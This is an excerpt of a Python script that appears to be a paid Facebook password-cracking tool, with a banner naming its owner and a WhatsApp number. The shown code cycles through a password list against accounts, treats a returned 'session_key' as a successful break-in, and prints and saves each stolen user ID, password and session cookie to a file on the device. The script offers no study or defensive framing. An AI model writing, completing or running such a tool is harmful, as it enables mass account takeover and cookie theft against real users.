...
#os.system('xdg-open https://github.com/Asifsakhani786') 
logox=(f"""
\033[0;37m╔━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━╗
\033[0;37m┃ ███████  ██████  ██   ██ ┃ \033[0;36m• \033[38;5;46mOWNER : ASIF SAKHANI\033[0;37m  ┃
\033[0;37m┃ ██      ██    ██  ██ ██  ┃ \033[0;36m• \033[38;5;46mWhatsapp  : 03417020930\033[0;37m  ┃
\033[0;37m┃ █████   ██    ██   ███   ┃ \033[0;36m• \033[38;5;46mSTATUS: PAID\033[0;37m ┃
\033[0;37m┃ ██      ██    ██  ██ ██  ┃ \033[0;36m• \033[38;5;46mVSN   : 4.0\033[0;37m  ┃
    ...
    try:
        ...
        for fikr in passlist:
            ...
            if 'session_key' in load:
                ...
                cookie = f"sb={sb};{kuki}"
                ids=str(load['uid'])
                print('\r\r\033[38;5;46m[ASIF] '+ids+' | '+pas)
                print(f"\033[38;5;46m[\033[0;36mCOOKIE\033[38;5;46m]> {cookie}")
                linex()
                oks.append(ids)
                open('/sdcard/ASIF-OK.txt','a').write(f"{ids}|{pas}|{cookie}")
                break
            else:
                continue
        loop+=1
